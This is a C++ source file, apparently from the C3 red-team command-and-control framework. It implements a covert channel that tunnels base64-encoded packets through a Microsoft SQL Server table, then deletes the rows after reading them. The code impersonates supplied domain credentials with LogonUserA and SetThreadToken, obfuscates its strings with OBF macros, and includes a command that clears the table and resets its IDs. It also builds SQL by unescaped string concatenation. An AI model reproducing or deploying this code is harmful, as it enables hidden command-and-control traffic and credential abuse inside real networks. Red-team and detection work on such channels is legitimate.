#include "Stdafx.h"
#include "MSSQL.h"
#include <sqlext.h>
#include <sqltypes.h>
#include <sql.h>
#include "Common/FSecure/Crypto/Base64.h"

namespace FSecure::Sql
{
	inline namespace Handle
	{
		namespace Detail
		{
			struct SqlHandleDeleter
			{
				SqlHandleDeleter(SQLSMALLINT type) noexcept : m_Type{ type }
				{
				}

				void operator()(SQLHANDLE handle) noexcept
				{
					SQLFreeHandle(m_Type, handle);
				}

			private:
				SQLSMALLINT m_Type;
			};

			using SqlHandle = std::unique_ptr<std::remove_pointer_t<SQLHANDLE>, SqlHandleDeleter>;

			SqlHandle MakeSqlHandle(SQLSMALLINT type, SQLHANDLE parent = SQL_NULL_HANDLE)
			{
				SQLHANDLE tmp;
				if (SQLAllocHandle(type, parent, &tmp) == SQL_ERROR)
				{
					auto GetTypeString = [](SQLSMALLINT type)
					{
						switch (type)
						{
						case SQL_HANDLE_ENV: return OBF("ENV");
						case SQL_HANDLE_SENV: return OBF("SENV");
						case SQL_HANDLE_STMT: return OBF("STMT");
						case SQL_HANDLE_DBC: return OBF("DBC");
						case SQL_HANDLE_DESC: return OBF("DESC");
						default: return "";
						}
					};
					throw std::runtime_error(OBF_STR("SQLAllocHandle for failed. handle type: ") + GetTypeString(type));
				}
				return SqlHandle(tmp, { type });
			}
		}

		class Statement
		{
		public:
			Statement(SQLHANDLE connection, std::string statement) : m_Stmt{Detail::MakeSqlHandle(SQL_HANDLE_STMT, connection)}, m_StmtString{std::move(statement)}
			{
				if (m_StmtString.size() > std::numeric_limits<SQLINTEGER>::max())
					throw std::runtime_error{ OBF("Statement too long") };
			}

			void Execute()
			{
				SQLRETURN retCode = SQLExecDirectA(m_Stmt.get(), (SQLCHAR*)m_StmtString.c_str(), static_cast<SQLINTEGER>(m_StmtString.size()));
				if (retCode == SQL_ERROR)
					throw std::runtime_error{ OBF("Failed to execute statement: ") + m_StmtString.substr(0, 80)};
			}

			SQLRETURN Fetch()
			{
				return SQLFetch(m_Stmt.get());
			}

			std::string GetString(SQLSMALLINT columnNumber)
			{
				std::string out;
				constexpr auto bufferSize = 4096;
				SQLLEN dataLen = 0;
				do
				{
					SQLCHAR buf[bufferSize];
					auto oldSize = out.size();
					auto status = SQLGetData(m_Stmt.get(), columnNumber, SQL_CHAR, buf, bufferSize, &dataLen);
					if (status == SQL_ERROR)
						throw std::runtime_error{ OBF("Failed to read data. coulmn number") + std::to_string(columnNumber) };
					out += reinterpret_cast<char*>(buf);
				} while (dataLen > bufferSize || dataLen == SQL_NO_TOTAL);
				return out;
			}

		private:
			Detail::SqlHandle m_Stmt;
			std::string m_StmtString;
		};

		class Connection
		{
		public:
			Connection(SQLHANDLE env, std::string const& servername, std::string const& databasename, std::string const& username, std::string const& password, bool useSSPI, HANDLE impersonationToken) : m_Connection{ Detail::MakeSqlHandle(SQL_HANDLE_DBC, env)}
			{
				std::string connString;
				if (useSSPI)
				{
					if (!username.empty())
					{
						//Sending and recieving could be different threads, have to inject the token per-thread
						if (!SetThreadToken(NULL, impersonationToken))
							throw std::runtime_error("[x] error setting token");
					}

					connString = OBF("DRIVER={SQL Server};SERVER=") + servername + OBF(", 1433;") + OBF("DATABASE=") + databasename + OBF(";Integrated Security=SSPI;");
				}
				else
				{
					connString = OBF("DRIVER={SQL Server};SERVER=") + servername + OBF(", 1433;") + OBF("DATABASE=") + databasename + OBF(";UID=") + username + OBF(";PWD=") + password;
				}

				if (connString.size() > std::numeric_limits<SQLSMALLINT>::max())
					throw std::runtime_error{ OBF("Connection string too long") };

				SQLRETURN retCode = SQLDriverConnectA(m_Connection.get(), NULL, (SQLCHAR*)connString.c_str(), static_cast<SQLSMALLINT>(connString.size()), nullptr, 0, nullptr, SQL_DRIVER_NOPROMPT);
				if (retCode == SQL_ERROR)
					throw std::runtime_error(OBF("[x] Unable to connect to MSSQL database"));
			}

			~Connection()
			{
				SQLDisconnect(m_Connection.get());
			}

			Statement MakeStatement(std::string statement)
			{
				return Statement(m_Connection.get(), std::move(statement));
			}

		private:
			Detail::SqlHandle m_Connection;
		};

		class Enviroment
		{
		public:
			Enviroment() : m_Env{Detail::MakeSqlHandle(SQL_HANDLE_ENV)}
			{
				if (SQLSetEnvAttr(m_Env.get(), SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0) != SQL_SUCCESS)
					throw std::runtime_error(OBF("[x] Error setting enviroment"));
			}

			Connection Connect(std::string const& m_servername, std::string const& m_databasename, std::string const& m_username, std::string const& m_password, bool m_useSSPI, HANDLE m_impersonationToken)
			{
				return Connection(m_Env.get(), m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);
			}

		private:
			Detail::SqlHandle m_Env;
		};
	}
}

namespace
{
	constexpr static auto ID_COLUMN = 1;
	constexpr static auto MSGID_COLUMN = 2;
	constexpr static auto MSG_COLUMN = 3;
	constexpr static auto MAX_MSG_BYTES = 700000000;
}

FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	ByteReader{ arguments }.Read(m_servername, m_databasename, m_tablename, m_username, m_password, m_useSSPI);

	//create a new impersonation token and inject it into the current thread.
	if (m_useSSPI && !this->m_username.empty())
	{
		std::string user, domain;
		HANDLE hToken;
		user = this->m_username.substr(this->m_username.find("\\") + 1, this->m_username.size());
		domain = this->m_username.substr(0, this->m_username.find("\\"));

		if (!LogonUserA(user.c_str(), domain.c_str(), this->m_password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
			throw std::runtime_error("[x] error creating Token");

		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &m_impersonationToken))
			throw std::runtime_error("[x] error duplicating token");

		CloseHandle(hToken);
	}

	Sql::Enviroment env;
	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);

	//Initial SQL Query is to identify if m_tablename exists
	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + m_tablename + OBF("';");
	auto hStmt = conn.MakeStatement(stmtString);
	hStmt.Execute();

	//if there are no rows then the table doesn't exist - so create it
	if (hStmt.Fetch() != SQL_SUCCESS)
	{
		stmtString = OBF("CREATE TABLE dbo.") + this->m_tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
		auto createStatement = conn.MakeStatement(stmtString);
		createStatement.Execute();
	}
}

size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteView packet)
{
	//connect to the database
	Sql::Enviroment env;
	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);

	size_t bytesWritten = 0;
	std::string b64packet = "";

	//Rounded down: Max size of bytes that can be put into a MSSQL database before base64 encoding
	if (packet.size() > MAX_MSG_BYTES)
	{
		auto strpacket = packet.SubString(0, MAX_MSG_BYTES);
		b64packet = cppcodec::base64_rfc4648::encode(strpacket.data(), strpacket.size());
		bytesWritten = strpacket.size();
	}
	else
	{
		b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
		bytesWritten = packet.size();
	}

	std::string stmtString = OBF("INSERT into dbo.") + this->m_tablename + OBF(" (MSGID, MSG) VALUES ('") + this->m_outboundDirectionName + "', '" + b64packet + OBF("');");
	auto hStmt = conn.MakeStatement(stmtString);
	hStmt.Execute();

	return bytesWritten;
}

std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnReceiveFromChannel()
{
	//connect to the database
	Sql::Enviroment env;
	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);

	const auto stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->m_tablename + OBF(" WHERE MSGID = '") + this->m_inboundDirectionName + OBF("';");
	auto hStmt = conn.MakeStatement(stmt);
	hStmt.Execute();

	std::vector<std::string> ids;
	std::vector<ByteVector> messages;

	while (hStmt.Fetch() == SQL_SUCCESS)
	{
		//get the ID
		auto id = hStmt.GetString(ID_COLUMN);
		ids.push_back(id);

		//Get the MSG column
		auto output = hStmt.GetString(MSG_COLUMN);
		auto packet = cppcodec::base64_rfc4648::decode(output);
		messages.push_back(std::move(packet));
	}

	//build a string '1','2','3',....,'N'
	std::string idList = "";
	for (auto &id : ids)
		idList += OBF("'") + id + OBF("',");

	//no need to send an empty delete command
	if (ids.size() > 0)
	{
		//Remove the trailing "," from the idList
		idList.pop_back();

		const auto stmt = OBF("DELETE FROM dbo.") + this->m_tablename + OBF(" WHERE ID IN (") + idList + OBF(");");;
		auto deleteStmt = conn.MakeStatement(stmt);
		//Delete all of the rows we have just read
		deleteStmt.Execute();
	}

	return messages;
}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::OnRunCommand(ByteView command)
{

	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		return ClearTable();
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::ClearTable()
{
	Sql::Enviroment env;
	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);

	{
		const auto deleteStmt = OBF("DELETE FROM dbo.") + this->m_tablename + ";";
		auto hStmt = conn.MakeStatement(deleteStmt);
		hStmt.Execute();
	}

	{
		//reset the ID to 0
		const auto resetStmt = OBF("DBCC CHECKIDENT('dbo.") + this->m_tablename + OBF("', RESEED, 0)");
		auto hStmt = conn.MakeStatement(resetStmt);
		hStmt.Execute();
	}
	return {};
}

const char* FSecure::C3::Interfaces::Channels::MSSQL::GetCapability()
{
	return R"_(
{
	"create": {
		"arguments": [
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Server Name",
				"description": "The Host of the target database"
			},
			{
				"type": "string",
				"name": "Database Name",
				"description": "The name of the database to write to"
			},
			{
				"type": "string",
				"name": "Table Name",
				"description": "The name of the table to write to"
			},
			{
				"type": "string",
				"name": "Username",
				"description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username",
				"min": 0
			},
			{
				"type": "string",
				"name": "Password",
				"description": "The password used to authenticate to the database",
				"min": 0
			},
			{
				"type": "boolean",
				"name": "Use Integrated Security (SSPI) - use for domain joined accounts",
				"description": "Set this to true and provide a domain\\username and password to perform token impersonation OR Set this to true and provide no credentials and the current process token will be used with SSPI",
				"defaultValue": false
			}
		]
	},
	"commands": [
		{
			"name": "Clear DB Table",
			"id": 0,
			"description": "Deletes all rows in the database",
			"arguments": []
		}
	]
}
)_";
}
